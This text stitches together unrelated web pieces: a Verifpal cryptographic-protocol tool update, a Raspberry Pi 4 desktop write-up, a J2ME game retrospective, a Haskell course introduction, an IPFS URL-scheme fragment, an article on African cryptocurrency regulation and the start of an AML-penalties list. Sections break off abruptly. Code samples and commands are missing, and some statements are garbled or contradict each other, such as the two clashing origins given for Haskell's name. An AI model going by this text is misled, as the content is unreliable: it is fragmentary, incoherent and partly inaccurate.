<figure><img src="https://pbs.twimg.com/media/EWtWLhcXsAEwUpV?format=jpg&amp;name=4096x4096" alt="Verifpal for Visual Studio Code allows visualizing and analyzing Verifpal models straight inside Visual Studio Code, with easy access to documentation for primitives and other functionality by hovering with the cursor."><figcaption>Verifpal for Visual Studio Code allows visualizing and analyzing Verifpal models straight inside Visual Studio Code, with easy access to documentation for primitives and other functionality by hovering with the cursor.</figcaption></figure>



<p><strong><span>Second</span>, Verifpal obtained new features that allow it to capture more of a protocol’s workings.</strong> Verifpal gained the ability to model protocols where users can potentially input <strong>weak or strong passwords</strong>. This is very useful for modeling protocols that include user-provided passwords at points, and is a great way to separate guessable passwords from material that can actually securely be used as an encryption key of some kind.&nbsp;<strong>New primitives</strong> were introduced, allowing the usage of <a href="https://source.symbolic.software/verifpal/verifpal/-/commit/fbc4d7372c0fe7df484d7331f045ff5710a63d37">ring signatures</a>, public key encryption, <a href="https://source.symbolic.software/verifpal/verifpal/-/commit/7467e8abb274778a1b668bed46d5ee67b8574478">Shamir secret sharing</a> and <a href="https://source.symbolic.software/verifpal/verifpal/-/commit/d2261c6b0daddbdccee9ef72e06604ede463d405">blind signatures</a>. The <em>leaks</em> keyword now exists, allowing principals to leak constants to the attacker without necessarily sending them to another principal. <strong><a href="https://source.symbolic.software/verifpal/verifpal/-/commit/221b85db613c6634069f323f84d21c89454db6db">Phases</a></strong> are an exciting new feature that allows Verifpal to reliably model post-compromise security properties such as forward secrecy or future secrecy.&nbsp; <strong><a href="https://source.symbolic.software/verifpal/verifpal/-/commit/780dc774226390eb8183c7ccfa61ed83a9d26e56">Query preconditions</a></strong> allow for illustration relationships between different Verifpal queries on a protocol. And dozens of small improvements and changes were made to Verifpal across its application stack.</p>



<p><strong><span>Finally, and most importantly</span>, Verifpal improved its analysis strength and reliability.</strong> As documented in a previous post, Verifpal’s formal semantics and passive attacker analysis are now <a href="https://blog.symbolic.software/2020/04/14/freshness-unlinkability-model-semantics-verifpal/">fully modeled in the Coq theorem prover</a>. While this does not include active attacker analysis methodology, it does indicate that we can capture Verifpal’s semantics elegantly in existing formalism methods as well as a basic component of its analysis methodology. Our <a href="https://verifpal.com/paper">revised Verifpal paper</a> goes into further detail on the Verifpal active attacker analysis methodology and describes formally how primitives are defined, deconstructed and analyzed in Verifpal. Furthermore, valuable feedback was received from over a dozen Verifpal community members that allowed detecting and fixing analysis errors, misleading analysis results and that pushed us to more concretely define the meaning and function of Verifpal queries such as freshness and authentication. These discussions occurred on the <a href="https://verifpal.com/list">Verifpal Mailing List</a>, the <a href="https://verifpal.com/discord">Verifpal Discord</a> as well as via private feedback.</p>

Given a primitive’s output and a defined subset of its inputs, reveal one of its inputs. (Given ENC(k, m) and k, reveal m).<br>• Recompose. Given a subset of a primitive’s outputs, reveal one of its inputs. (Given a, b, reveal x if a ,b,_ = SHAMIR_SPLIT(x)).<br>• Rewrite. Given a matching defined pattern within a primitive’s inputs, rewrite the primitive expression itself into a logical subset of its inputs. (Given DEC(k, ENC(k, m)), rewrite the entire expression DEC(k, ENC(k, m)) to m).<br>• Rebuild. Given a primitive whose inputs are all the outputs of some same other primitive, rewrite the primitive expression itself into a logical subset of its inputs. (Given SHAMIR_JOIN(a, b) where a, b, c = SHAMIR_SPLIT(x), rewrite the entire expression SHAMIR_JOIN(a, b) to x).</figcaption></figure>



<h2>Understanding Verifpal’s Purpose in the Protocol Security Space</h2>



<p>Given Verifpal’s progress over its first year, it becomes ever more important to clearly answer the question: <em>“Where is Verifpal positioned within the protocol security space in comparison to other tools?”</em> What is Verifpal able to do for me, the protocol analyst, engineer or applied cryptography practitioner?</p>



<p><strong>Verifpal appears to be evolving towards being software best suited for designing, modeling, analyzing and testing cryptographic protocols. </strong>Notably, this means that Verifpal is <em>not</em> likely to progress in the direction where it functions as a producer of <em>protocol security proofs</em>, nor does our experience lead us to believe that this is a space where more contributions are likely to be useful or impactful. This latter functionality will likely remain the jurisdiction of tools such as <a href="https://tamarin-prover.github.io/">Tamarin</a>.</p>



<p><strong>Verifpal’s goal is to focus on the real-world priority of exceeding these tools in terms of how much time and effort it will take for the engineer or practitioner to obtain a meaningful model of their protocol that gives them meaningful analysis answers.</strong> However, the compromises to ease of use and modeling/analysis rapidity required for Verifpal to offer full proving capabilities are deemed too great given Verifpal’s design and functionality goals, and therefore will likely never be adopted fully into its functionality.</p>

<p><strong>In deciding Verifpal’s priorities, we slam the brakes at the moment where the learning curve, effort and analysis cost begin to have strongly diminishing returns for the user.</strong> Our bet is that this path forward for Verifpal will lead to a hugely more substantial impact for engineers and practitioners than traditional automated proof modeling tools. In the example above, we can see how Verifpal makes compromises in analysis completeness that preclude its ability to output full proofs but that greatly increase the likelihood of analysis termination (a significant problem for tools such as <a href="https://prosecco.gforge.inria.fr/personal/bblanche/proverif/">ProVerif</a>) without having an apparently significant impact on the analysis of real-world, non-Ivory-Tower protocols.</p>



<p>Ergo, Verifpal’s main responsibility is to straddle a balance between soundness/reliability  and ease of use/relevance to real-world practitioners. The way we approach this responsibility is by making sure that Verifpal’s semantics are formally specified, that its analysis methodology is amply documented, and that its code is easy to understand. <a href="https://source.symbolic.software/verifpal/verifpal/-/blob/master/internal/libcoq/libcoqtemplate.v">Verifpal’s formal semantics in Coq</a>, the analysis methodology details in the <a href="https://verifpal.com/paper">Verifpal paper</a>  documented and easy-to-understand <a href="https://source.symbolic.software/verifpal">Go codebase</a> aim to fulfill this purpose.</p>



<p>Simultaneously, Verifpal utilizes this formally specified base in order to maintain the development of a language and framework that is idiomatic to the extreme. The Verifpal language is meant to illustrate protocols close to how one may describe them in an informal conversation, while still being precise and expressive enough for formal modeling. Verifpal avoids user error by not allowing users to define their own cryptographic primitives. Instead, it comes with built-in cryptographic functions which nevertheless are defined and which operate according to a formally specified standard with concrete semantics. All of this is coupled with a high standard for documentation, accessibility and support in popular workflows and code editors (via Verifpal for Visual Studio Code and VerifHub).</p>



<p>So far, Verifpal’s chosen path has allowed it to provide value in the <a href="https://blog.symbolic.software/2020/04/05/dp-3t-verifpal/">quick modeling and correct analysis of the DP-3T pandemic contact tracing protocol as it was being specified</a>, and has helped Zoom, Monocypher <a href="https://verifpal.com/getinvolved/">and others</a> achieve quick protocol modeling and prototyping insight as they developed their protocols, by offering a methodology and framework that allowed results to be obtained in hours (sometimes minutes!) instead of weeks. We hope to continue making exciting developments in Verifpal well into 2021, and can’t wait to see how the community makes use of it.</p>

<p>I use a Raspberry Pi 4 as my personal daily driver and it’s pretty great. I know these types of devices tend to be used for smaller pet-projects or fun experiments, but I thought I would share my experience using one as my main computer. Hopefully this can be a solid guide to help others who might be interested in creating a similar setup.</p>

<p>My desktop Pi working away on a regular morning:</p>

<h2 id="my-use-case">My Use Case</h2>

<p>I’m a web designer and developer by trade. Therefore, I require a decent amount of functionality from my computer - more than just simple web browsing and document editing. When I first set out testing if the RPi4 <em>could</em> become my main device, I was surprised at how capable the hardware / software was at running all my required applications. My workload comprises of:</p>

<ul>
  <li>Using Github/Gitlab to pull/push repos, open PRs, etc</li>
  <li>Run SSG (Jekyll mostly) locally for testing</li>
  <li>Run multiple WordPress instances locally</li>
  <li>Edit design files (Photoshop, Illustrator, direct SVGs)</li>
  <li>Simple web chat / email</li>
</ul>

<p>Basic stuff, but I was originally doubtful of the RPi4 to be able to handle it all smoothly. I’m happy to say I was wrong.</p>

<hr id="hardware">

<h2 id="the-hardware">The Hardware</h2>

<p>The following hardware list is what I use specifically for my intended use case. I’m also a sucker for having cool looking SBC builds. By no means is this the “best setup” for everyone - I’m sure other combinations of gear might better suit your own personal needs.</p>

</ul>

<hr id="software">

<h2 id="the-software">The Software</h2>

<p>The 32-bit version of Raspberry Pi OS (‘Debian Buster’ at the time of writing) is my OS of choice. Stable, reliable, and officially supported by the RPi community. It does the job.</p>

<p>The Pi has been overclocked to 2GHz in order to squeeze just a <em>little</em> extra out of the hardware. This has caused zero issues.</p>

<p>I’m also booting directly from the mSATA SSD (via USB booting) instead of relying on a slower microSD card. You can find tons of tutorials online on how to do the same, but I would recommend this one: <a href="https://www.tomshardware.com/how-to/boot-raspberry-pi-4-usb">How to Boot Raspberry Pi 4 From a USB SSD or Flash Drive</a></p>

<p>After that, I simply installed my required apps / configs (where applicable):</p>

<ul>
  <li>Chromium (<em>preinstalled</em>)</li>
  <li>Firefox ESR</li>
  <li>Pale Moon</li>
  <li>Code OSS</li>
  <li>Terminal (<em>preinstalled</em>)</li>
  <li>Libre Office Suite</li>
  <li>Evolution</li>
  <li>Figma (Web - no install needed)</li>
  <li>Apache2 / MySQL</li>
  <li>Blueman (helpful GUI for bluetooth)</li>
</ul>

<h2 id="performance--stats">Performance &amp; Stats</h2>

<p>Using this build day-to-day, I can honestly say I don’t hit any hiccups or lag at all. Multiple applications and WordPress instances are running in the background, while 10-15 tabs are open in the Chromium browser. The little Pi just chugs along without breaking a sweat.</p>

<p>My average CPU temperature sits around 51° (with heatsinks &amp; fan active) while CPU usage never really cranks past 90% during even “intensive” processes.</p>

<p>Since <em>actual</em> data speaks louder than anecdotal chit-chat, I performed a very simple read/write test on my mSATA SSD.</p>

<p>First, clear the cache to avoid conflicting data:</p>

<p>This gives a total read/write value of: <strong>268 MB / 680 MB</strong> per second. Compare that to average microSD card speeds floating around <strong>22 MB / 170MB</strong> per second and you can see (and feel) the massive speed difference. Things are just snappier.</p>

<p><strong>Note</strong>: Obviously extremely high-end (read: expensive) microSD cards <em>might</em> hit read/write speeds similar to that of an SSD. The issue is that you are more likely to corrupt or reach end-of-life with a microSD card - hence why I don’t recommend them.</p>

<p>I love that I can use a fairly cheap Raspberry Pi 4 as my main, personal desktop. Of course, some people might roll their eyes at this build and say, “why not just get a cheaper, more powerful laptop off eBay?”. To that I would respond: <em>you’re missing the point</em>.</p>

<p>It was fun to put together this simple desktop. The fact that it runs fast and stable enough to be my daily driver is a great bonus. If this build interests you at all, I highly recommend giving it a go.</p>

              <div>
                <p>Cyber Ninja was a platformer mobile game, developed in 2004. This was the first mobile game I’ve ever made! </p>



<p>It was a collaboration effort, involving a friend who that acted as producer and game designer. Originally, it was to be called Impalator and sport a medieval/fantasy theme, but this later changed to a high-tech/sci-fi theme. It was supposed to compete with mobile platformers of that time, namely Prince of Persia and Splinter Cell.</p>



<p>The game-play was a combination of pure platforming (jump, run, dodge enemies), puzzle (e.g. “hack” terminals to activate platforms) and combat. The combat phase was very similar to Blizzard’s Black Thorne (a “hide-from-projectiles” mechanic).</p>

</p></figure>



<p>I developed the game in Java for J2ME, with Nokia 3510i as the master version. The technical restrictions were quite crazy, as 3510i had 96×65 pixels resolution, with 64kb of package and 210kb of RAM. Developing the engine and tools, as well as optimizing for this platform took about 3 months of working in the spare time.  As far as I remember, I was using JBuilder for developing the engine and C++Builder for developing the game editor. </p>



<p>Fun fact, I was working 2 jobs at that time, and this one came as a third 🙂</p>



<div><figure><img loading="lazy" width="256" height="565" src="https://www.pirongames.com/wp-content/uploads/2020/01/cn_on_6320_emu.png" alt="" srcset="https://www.pirongames.com/wp-content/uploads/2020/01/cn_on_6320_emu.png 256w, https://www.pirongames.com/wp-content/uploads/2020/01/cn_on_6320_emu-136x300.png 136w" sizes="(max-width: 256px) 100vw, 256px"></figure></div>



<p>Unfortunately, the game ended up with only one level due to the game designer losing interest in the project. As the attempts to find a buyer failed to materialize into something concrete, we decided to abandon the project. </p>



<p>I’ve ended up releasing the source code and tools (and modified graphics) as open-source/GPL, under the name of <a href="https://sourceforge.net/projects/lethalmetal/">Lethal Metal</a>. Sure, in this day when even web games have 10-20Mb and eat up hundred of MB of RAM, this game is rather out of place. However, you may find ideas on how to implement various platformer features (moving platforms, elevators, climbing, etc) in an efficient no-non-sense way.</p>

<h2 id="about-the-course"> About the course</h2>
<p>This is an online course on Functional Programming that uses the Haskell programming language. You can study at your own pace. All the material and exercises are openly available.</p>
<p>This course is aimed at beginners who wish to learn functional programming, but also people who have experience with functional programming and want to learn Haskell in particular. The course assumes no previous knowledge, but knowing at least one programming language beforehand will make the course easier.</p>
<p>Working on the exercises involves knowing how to use the command line, and basic usage of the Git version control system.</p>
<p>This is part 1 of a two-part course. Part 1 covers the basics of Haskell syntax and features. You will learn about recursion, higher-order functions, algebraic data types and some of Haskell’s advanced features. However, part 1 will stick to pure functional programming, without side-effects. I/O and Monads will be introduced in part 2.</p>

<h2 id="haskell"> Haskell</h2>
<p>Haskell is</p>
<p><strong>Functional</strong> – the basic building blocks of programs are functions. Functions can return functions and take functions as arguments. Also, the only looping construct in Haskell is recursion.</p>
<p><strong>Pure</strong> - Haskell functions are pure, that is, they don’t have side effects. Side effects mean things like reading a file, printing out text, or changing global variables. All inputs to a function must be in its arguments, and all outputs from a function in its return value. This sounds restricting, but makes reasoning about programs easier, and allows for more optimizations by the compiler.</p>
<p><strong>Lazy</strong> - values are only evaluated when they are needed. This makes it possible to work with infinite data structures, and also makes pure programs more efficient.</p>
<p><strong>Strongly typed</strong> - every Haskell value and expression has a type. The compiler checks the types at compile-time and guarantees that no type errors can happen at runtime. This means no AttributeErrors (a la Python), ClassCastExceptions (a la Java) or segmentation faults (a la C). The Haskell type system is very powerful and can help you design better programs.</p>
<p><strong>Type inferred</strong> - in addition to checking the types, the compiler can deduce the types for most programs. This makes working with a strongly typed language easier. Indeed, most Haskell functions can be written completely without types. However programmers can still give functions and values type annotations to make finding type errors easier. Type annotations also make reading programs easier.</p>
<p><strong>Garbage-collected</strong> - like most high-level languages these days, Haskell has automatic memory management via garbage collection. This means that the programmer doesn’t need to worry about allocating or freeing memory, the language runtime handles all of it automatically.</p>
<p><strong>Compiled</strong> - even though we mostly use Haskell via the interactive GHCi environment on this course, Haskell is a compiled language. Haskell programs can be compiled to very efficient binaries, and the GHC compiler is very good at optimising functional code into performant machine code.</p>
<p>You’ll learn what these terms mean in practice during this course. Don’t worry if some of them sound abstract right now.</p>
<p>See also: <a href="https://wiki.haskell.org/Functional_programming">The Haskell Wiki page on Functional programming</a>.</p>
<h3 id="features"> Features</h3>
<p>Here’s a showcase of some of the Haskell’s cool features:</p>
<p><strong>Higher-order functions</strong> – functions can take functions as arguments:</p>

<p>This results in <code>[3,6]</code>.</p>
<p><strong>Anonymous functions aka lambdas</strong> – you can define single-use helper functions without giving them a name</p>

<p>This results in <code>["abc","ef"]</code>.</p>
<p><strong>Partial application</strong> – you can define new functions by giving another function only some of the arguments it needs. For example this multiplies all elements in a list by 3:</p>

<p><strong>Algebraic datatypes</strong> – a syntax for defining datatypes that can contain a number of different cases:</p>

<p>Now the type <code>Shape</code> can have values like <code>Point</code>, <code>Rectangle 3 6</code> and <code>Circle 5</code></p>
<p><strong>Pattern matching</strong> – defining functions based on cases that correspond to your data definitions:</p>

<p><strong>Lists</strong> – Unlike many languages, Haskell has a concise built-in syntax for lists. Lists can be built from other lists using <em>list comprehensions</em>. Here’s a snippet that generates names of even length from a set of options for first and last names:</p>

<p>This results in <code>["EvaSmith","EvaOdd","MikeWood"]</code>. Thanks to the laziness of Haskell, we can even create so-called <em>infinite lists</em>:</p>

<p>The first ten prime numbers can be then obtained by evaluating</p>

<p>This evaluates to <code>[2,3,5,7,11,13,17,19,23,29]</code>.</p>
<p><strong>Parameterized types</strong> – you can define types that are parameterized by other types. For example <code>[Int]</code> is a list of <code>Int</code>s and <code>[Bool]</code> is a list of booleans. You can define typed functions that work on all kinds of lists, for example <code>reverse</code> has the type <code>[a] -&gt; [a]</code> which means it takes a list containing any type <code>a</code>, and returns a list of the same type.</p>
<p><strong>Type classes</strong> – another form of polymorphism where you can give a function a different implementation depending on the arguments’ types. For example the <code>Show</code> type class defines the function <code>show</code> that can convert types of various values to strings. The <code>Num</code> type class defines arithmetic operators like <code>+</code> that work on all number types (<code>Int</code>, <code>Double</code>, <code>Complex</code>, …).</p>
<h3 id="some-history"> Some History</h3>
<p>A brief timeline of Haskell:</p>
<ul>
<li>1930s: Lamba Calculus</li>
<li>1950s-1970s: Lisp, Pattern Matching, Scheme, ML</li>
<li>1978 John Backus: <a href="https://www.thocp.net/biographies/papers/backus_turingaward_lecture.pdf">Can programming be liberated from the von Neumann style?</a></li>
<li>1987 A decision was made to unify the field of pure functional languages</li>
<li>1990 Haskell 1.0</li>
<li>1991 Haskell 1.1 (let-syntax, sections)</li>
<li>1992 Haskell 1.2, GHC</li>
<li>1996 Haskell 1.3 (Monads, do-syntax, type system improvements)</li>
<li>1999 Haskell 98</li>
<li>2000’s: GHC development, many extensions to the language</li>
<li>2009 <a href="http://www.haskell.org/onlinereport/haskell2010/">The Haskell 2010 standard</a></li>
<li>2010’s: GHC development, Haskell Platform, Haskell Stack</li>
</ul>
<p>The word ‘haskel’ means wisdom in Hebrew, but the name of the Haskell programming language comes from the logician Haskell Curry. The name Haskell comes from the Old Norse words áss (god) and ketill (helmet).</p>

<h2 id="running-haskell"> Running Haskell</h2>
<p>The easiest way to get Haskell is to install the <code>stack</code> tool, see <a href="http://haskellstack.org/">http://haskellstack.org</a>. The exercises on this course are intended to work with Stack, so you should use it for now.</p>
<p>By the way, if you’re interested in what Stack is, and how it relates to other Haskell tools like Cabal and GHC, <a href="https://www.quora.com/What-is-the-difference-between-Cabal-and-Stack-in-Haskell-projects-Which-one-do-you-recommend-and-why">read more here</a> or <a href="https://docs.haskellstack.org/en/stable/faq/">here</a>. We’ll get back to Haskell packages and using them in detail in part 2 of the course.</p>
<p>For now, after installing Stack, just run <code>stack ghci</code> to get an interactive Haskell environment.</p>
<h2 id="lets-start"> Let’s start!</h2>
<p>GHCi is the interactive Haskell interpreter. Here’s an example session:</p>
<pre><code>$ stack ghci
GHCi, version 8.0.1: http://www.haskell.org/ghc/  :? for help
Prelude&gt; 1+1
2
Prelude&gt; "asdf"
"asdf"
Prelude&gt; reverse "asdf"
"fdsa"
Prelude&gt; :type "asdf"
"asdf" :: [Char]
Prelude&gt; tail "asdf"
"sdf"
Prelude&gt; :type tail "asdf"
tail "asdf" :: [Char]
Prelude&gt; :type tail
tail :: [a] -&gt; [a]
Prelude&gt; :quit
Leaving GHCi.</code></pre>
<p>By the way, the first time you run <code>stack ghci</code> it will download GHC and some libraries, so don’t worry if you see some output and have to wait for a while before getting the <code>Prelude&gt;</code> prompt.</p>
<p>Let’s walk through this. Don’t worry if you don’t understand things yet, this is just a first brush with expressions and types.</p>
<pre><code>Prelude&gt; 1+1
2</code></pre>
<p>The <code>Prelude&gt;</code> is the GHCi prompt. It indicates we can use the functions from the Haskell base library called Prelude. We evaluate 1 plus 1, and the result is 2.</p>
<pre><code>Prelude&gt; "asdf"
"asdf"</code></pre>
<p>Here we evaluate a string literal, and the result is the same string.</p>
<pre><code>Prelude&gt; reverse "asdf"
"fdsa"</code></pre>
<p>Here we compute the reverse of a string by applying the function <code>reverse</code> to the value <code>"asdf"</code>.</p>
<pre><code>Prelude&gt; :type "asdf"
"asdf" :: [Char]</code></pre>
<p>In addition to evaluating expressions we can also ask for their type with the <code>:type</code> (abbreviated <code>:t</code>) GHCi command. The type of <code>"asdf"</code> is a list of characters. Commands that start with <code>:</code> are part of the user interface of GHCi, not part of the Haskell language.</p>
<pre><code>Prelude&gt; tail "asdf"
"sdf"
Prelude&gt; :t tail "asdf"
tail "asdf" :: [Char]</code></pre>
<p>The <code>tail</code> function works on lists and returns all except the first element of the list. Here we see <code>tail</code> applied to <code>"asdf"</code>. We also check the type of the …</p></div></div></div>

It could allow deep linking with a desktop application, such as IPFS Desktop, but this is still unclear.</p><h2 id="alternative-name-system">Alternative name system</h2><p>For alternative name system, this would be quite handy, as it provides a direct access to the URL.
We could imagine <code>ipns://uniswap.eth</code> or even <code>ipns://uniswap.crypto</code> . Both ENS domains and Unstoppable domains could have a handler for these URLs.</p><h2 id="client-side-verification">Client side verification</h2><p>Ultimately, if there are (and I don’t know) <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API">web workers</a> capable of handling these newly safelisted schemes, there would be a way towards client side content verification. And this is major.</p><p>We could imagine a service worker running and verifying the hash of the received content. It would provide a strong guarantee about the content that is being served, without requiring any extensions or local process to be installed.</p><p>This step from Chromium would allow further experimentation in the distributed web.
While having the browser resolve and handle these schemes would make sense, allowing websites to register their ability to handle them should provide a fertile ground for innovation.</p></div></article></section></div></div>]]>

</article>

<section><div><div><div><div><div><h2>Introduction</h2>
	<div>
		<div>
			<p><span>The government of Africa has been a bit slow with the adoption of cryptocurrencies. Maybe it is due to the reasons like good attentions of protecting their people or having a crop of old leaders who have not to envision a future without paper cash, Africa is now slowly picking up the pace towards the era of Cryptocurrency.</span></p>
<p><span>The majority of the younger generation of the popular countries of Africa, like Nigeria, Kenya, Egypt, and South Africa, is investing their time in the Bitcoin Technology, disregarding the regulation skepticism on the continent.</span></p>
<p><span>The Central Bank of Nigeria has kept itself away from the Bitcoin movements twice and even warned the citizens that bitcoin investments had no legal intention. Furthermore, there seem to be no crypto exchanges established in Botswana. Bitcoin trading is also restricted to private Facebook and Whatsapp groups. The Bank of Gana also announced that use and trading Cryptocurrency is illegal yet or it is not considered as a lawful form of currency in the country. However, the Governor of the Bank of Ghana has issued Payment Systems and Services Bill, which will enable the regulation of Cryptocurrency in the future.</span></p>
<p><span>Nonetheless, the trading of Bitcoin is quite booming in Nigeria. Many people believe that this boom in Bitcoin trading is brought by a busted online Ponzi scheme, named MMM scheme. This scheme brought trading into the mainstream with a lot of ease.</span></p>
<p><span>The Central Bank of Nigeria first reacted to virtual currencies in January 2017 and warned the citizens to handle cryptocurrencies at their own risks. Some of the people misunderstood the warning as a ban, but officials of the Bank have since declared that they cannot put a full stop on the usage of Bitcoin because it is quite evident that they are not within their control.</span></p>
<p><span>South Africa, Ghana, and Nigeria are amongst those countries that have managed to count amongst the top 10 ranked names for Bitcoin technology across the globe.</span></p>
<p><span>In the following section, we have discussed the Cryptocurrency regulation outlook in these African countries along with a few others. Let’s get started!</span></p>

		</div>
	</div>
<h2>South Africa</h2>
	<div>
		<div>
			<p><span>The government in South Africa is less strict regarding the trading of the Bitcoin. The South African Revenue Services has been discovering many ways in which Cryptocurrency investments can be appropriately taxed. In April 2018, SARS (South African Revenue Services) stated that the citizens of South Africa should reveal their income derived from Cryptocurrency investments as an integral part of their capital profit statement.</span></p>
<p><span>SARS also argued that cryptocurrencies must be taxed based on the intention with which they are being held. Therefore, profits and losses regarding cryptocurrencies can be widely categorized as having three major outcomes that are mentioned as follows:</span></p>
<ul>
<li><span>Investors trading cryptocurrencies on exchanges will be liable for the capital profits earned during investments.&nbsp;</span></li>
<li><span>A Cryptocurrency can be obtained via mining but until the newly obtained Cryptocurrency is exchanged or sold for cash, it will be managed by the miner as trading stock.</span></li>
<li><span>The normal barter transaction regulations will apply where services are exchanged for cryptocurrencies. </span></li>
</ul>
<p>In 2017, The South Africa Reserve Bank (SARB) has launched a project (Project Khokha) to discover Blockchain – the distributed ledger technology. During early 2018, the bank finished a 14-week proof-of-concept on the blockchain. This managed to settle everyday 70,000 payment transactions of the country within 2 hours while taking an average of 1 to 2 seconds of every transaction.</p>

		</div>
	</div>
<h2>Ghana</h2>
	<div>
		<div>
			<p><span>In January 2018, the Bank of Ghana declared that buying and selling Bitcoin in the Country is not yet lawful as it isn’t a recognized lawful tender. The BOG also wants to notify the citizens that these activities in digital currency are licensed currently under the Payments System Act 2003. Currently, the Bank is investing a lot of resources to modify further the settlements and payments system, including e-form of money and to launch cybersecurity guidelines to protect online financial transactions.</span></p>
<p><span>In this country, more than 80 percent of landlords lack official title deeds with Ghana’s Land of Commission and most of the land is being held via verbal agreements. In order to solve this issue, start-up Bitland of Ghana is making use of blockchain technology to mirror official title deeds, elevating the integrity of the land records that are held by the Land Commission of Ghana.</span></p>

		</div>
	</div>
<h2>Kenya</h2>
	<div>
		<div>
			<p><span>Digital currencies remain booming in Kenya. The law of Kenya does not have a regulatory framework for a blockchain. However, the National Land Commission of Kenya has welcomed the idea of blockchain network usage in creating transparency of land ownership, since it will boost fraudulent sales of land and blur over the title to land.</span></p>
<p><span>After the governor of Central Bank of Kenya compared bitcoin to a pyramid scheme in 2017, there are some proofs that the bank may be wishing to soften its position going forward. In 2018, President of Kenya, Uhuru Kenyatta had directed that AI taskforce and Blockchain can be created to discover the utilization of these technologies with the existing economic framework of Kenya. Furthermore, the Capital Market Authority, and Central Bank of Kenya, Societies Regulatory Authority and Insurance Regulatory Authority are due for a meeting to discuss who they can regulate virtual currencies.&nbsp;&nbsp;</span></p>
<p><span>Another initiative was taken in the private sector of Kenya – it launched TMT Global Coin, a logistics company powered by blockchain that believes in improving cargo logistics globally by utilizing blockchain technology via smart contracts to enhance the authenticity and transparency of records in exports and imports.</span></p>

		</div>
	</div>
<h2>Nigeria</h2>
	<div>
		<div>
			<p><span>Nigeria is counted amongst the largest economies of Africa. Many times, Nigeria has warned the citizens, as well as the local banks, regarded doing business with Crypto exchanges. Nonetheless, with the economy embracing stability over the past couple of months in 2018, the head of Bank, Musa Jimoh, revealed has started looking into these virtual currencies from a policy point of view.</span></p>
<p><span>Despite such warnings, a Ponzi scheme related to Bitcoin resulted in around 12 million residents of Nigeria who lost a combined $50 million in early 2017.</span></p>
<p><span>Furthermore, the Nigerian Deposit Insurance Corporation also warned the citizens of Nigeria – they would not be afforded protection for customers or insurance from the NDIC when buying and selling in cryptocurrencies since the Central Bank of Nigeria has not issued virtual currencies. In addition to this, NDIC also stated that none of the central banks will accept digital currency as an alternative for its national currency when it is not capable of controlling it.</span></p>
<p><span>Despite the above responses by The Central Bank of Nigeria and the NDIC, Nigeria keeps the world’s third-largest holdings for Bitcoin as the percentage of gross domestic product.</span></p>

		</div>
	</div>
<h2>Mauritius</h2>
	<div>
		<div>
			<p><span>Mauritius issued an open call to trendsetters to take benefit of its new Regulatory Sandbox License in May 2017. But it was required that applicants should ensure their project is innovative, advantageous to the economy of Mauritius, and cannot be accommodated in the home jurisdiction of trendsetter due to regulatory or legal gaps. The government of Mauritius is specifically looking for some impressive fintech startups and strives to be recognized as Ethereum Island.</span></p>
<p><span>In February 2018, the Innovation-Driven Financial Services Regulatory Committee and the Fintech met to make recommendations to Mauritius’ government on the requirement to launch new sets of regulations for innovation and fintech.</span></p>
<p><span>However, there has been no such lawsuit or court action reported in Mauritius yet.</span></p>

		</div>
	</div>
<h2>Cryptocurrency Taxation Outlook</h2>
	<div>
		<div>
			<p><span>A draft, named TLAB (Taxation Laws Amendment Bill) has been issued and suggests several amendments to the Income Tax Act (1962) and the VAT Act 89 (1991), which looks for clarifying the current provisions that are dealing with crypto assets in the South African tax regulation.</span></p>
<p><span>Under the Value Added Tax Act 89 of 1991, it is suggested to amend section 2 to be added in the definition of financial services, the collection, acquisition, issue, trading, or transfer of ownership of any digital or crypto asset. Consequently, if the suggestion concerning the Value Added Tax Act is accepted, all dealings related to crypto-assets will be supposed to be exempt from VAT in terms of the VAT Act’s section 12.</span></p>
<p><span>Under the Income Tax Act 58 of 1962, it is suggested that crypto-assets be added in the description of the Financial Instrument. Nonetheless, it is also suggested to amend the Income Tax Act’s section 20A, to add the acquisition of any crypto assets beneath the ring-fencing of accessed loss provisions. If this suggested is permitted, dealers of crypto assets will be able to offset the losses incurred from dealing in crypto assets from other trades.</span></p>
<p><span>The attention behind these suggested amendments to the tax regulation is to clear out the tax treatment of crypto assets under the tax regulations. From the perspective of an income tax, crypto-assets should be treated as financial instruments for income tax, and from the perspective of Value Added Tax, the collection, issue, trading, acquisition, and transfer of crypto assets ownership should be treated as a financial service.</span></p>

		</div>
	</div>
<h2>Final Thoughts</h2>
	<div>
		<p><span>Interest in Cryptocurrency is progressively growing in Africa. According to some economists, it is a disruptive innovation that will blossom on Africa. Every country in the continent has a different approach towards regulation cryptocurrencies or Cryptocurrency exchanges or Bitcoin trading. If you are planning to establish a&nbsp;</span><a href="https://www.espay.exchange/white-label-crypto-exchange-software"><b>white label crypto exchange software development company</b></a><span>&nbsp;or&nbsp;white label crypto exchange, you need to have a look at the Cryptocurrency compliance …</span></p></div></div></div></div></div></div></section></div></div>

                <p><span>Anti-money laundering (AML) regulations, audits and penalties continue to rise in 2020. Money laundering, terrorist financing, corruption, bribery, and all other financial crimes have many negative consequences, both economically and socially. We are closely witnessing the work that governments and AML regulators are doing to eliminate these negative consequences. All local and international AML regulators, notably FATF, European Union and Wolfsberg Group, aim to guide the fight against financial crime.</span></p><p><span>With the development of technology, access to financial instruments becomes easier. Although this has made our lives easier, it has created various opportunities for criminals. Gaps in emerging industries such as the crypto industry create major financial crime risks. </span></p><p><span>When we look at the total AML penalties in recent years, we observe an increase in the total penalty amount. Failures in the compliance processes of financial institutions cause them to face heavy fines. While the AML penalties given in 2018 were approximately $ 4 billion, the AML penalties given in 2019 increased by approximately 2 times to approximately $ 8 billion. When we examine some of the data announced in 2020, we see that the AML penalties given in the first half of 2020 are close to 6 billion dollars. Some of the reasons for the AML fines are due to deficiencies in the "Know Your Customer", "Customer Due Diligence" and "Monitoring Suspicious Transactions" procedures.</span></p><p><span>In this article, we will share with you the AML penalties issued by the regulators in 2020. If you have any news you want to add, feel free to contact us. </span></p><p><span><i>(Will be updated)</i></span></p><h2><b>Sri Lanka Fines 2 Banks, 3 Finance Firms for AML Failures</b></h2><p><span>Sri Lanka’s Financial Intelligence Unit fined two banks and three finance companies for violating anti-money laundering obligations.

